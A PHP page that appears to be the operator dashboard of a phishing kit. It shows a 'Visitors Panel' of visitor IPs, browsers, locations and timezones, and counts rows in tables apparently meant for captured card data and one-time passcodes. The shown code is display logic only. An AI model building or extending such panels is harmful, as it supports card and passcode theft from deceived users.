<?php  ?>
<div align='center' id='01'>
	<script type="text/javascript">
		document.onreadystatechange = function() {
			var state = document.readyState
			if (state == 'complete') {
				setTimeout(function() {
					document.getElementById('interactive');
					// document.getElementById('fixed').style.visibility="hidden";
					var rowCount = $("#vis td").closest("tr").length;
					var message = rowCount;
					var rowCount2 = $("#cc td").closest("tr").length;
					var message2 = rowCount2;
					var rowCount3 = $("#otp td").closest("tr").length;
					var message3 = rowCount3;
					document.getElementById('lbl').innerText = message;
					document.getElementById('lbl2').innerText = message2;
					document.getElementById('lbl3').innerText = message3;
				}, );
			}
		}
	</script>
	<?php
	include '../system/setting.php'; {
	?> <div class="main-overview">
			<div class="overviewcard">
				<div class="overviewcard__icon"><svg width="3em" height="3em" viewBox="0 0 16 16" fill="currentColor" class="bi bi-eye">
						<path fill-rule="evenodd" d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.134 13.134 0 0 0 1.66 2.043C4.12 11.332 5.88 12.5 8 12.5c2.12 0 3.879-1.168 5.168-2.457A13.134 13.134 0 0 0 14.828 8a13.133 13.133 0 0 0-1.66-2.043C11.879 4.668 10.119 3.5 8 3.5c-2.12 0-3.879 1.168-5.168 2.457A13.133 13.133 0 0 0 1.172 8z" />
						<path fill-rule="evenodd" d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z" />
					</svg></div>
				<br>
				<h3> Visitors Panel </h3>
				<div id="lbl" class="overviewcard__info"><span class='fui-eye'></span><br></div>
			</div>
		</div>
		<table id='vis' width='76' class='table table-hover'>
			<br>
			<tr>
				<th width='80'>
					<p align='center'>IP</td>
				<th width='80'>
					<p align='center'>Browser</td>
				<th width='80'>
					<p align='center'>os</td>
				<th width='30'>
					<p align='center'>Country Code</td>
				<th width='80'>
					<p align='center'>Date & time</td>
				<th width='80'>
					<p align='center'>State</td>
				<th width='80'>
					<p align='center'>Country</td>
				<th width='80'>
					<p align='center'>Currency</td>
				<th width='80'>
					<p align='center'>Timezone</td>
			</tr>

			<?php if (file_exists('vis' . $namerand . '.html')) {
				include 'vis' . $namerand . '.html';
			} else {
				echo "0 VISIT$";
			} ?>
		</table>
</div>
<?php
	}
?>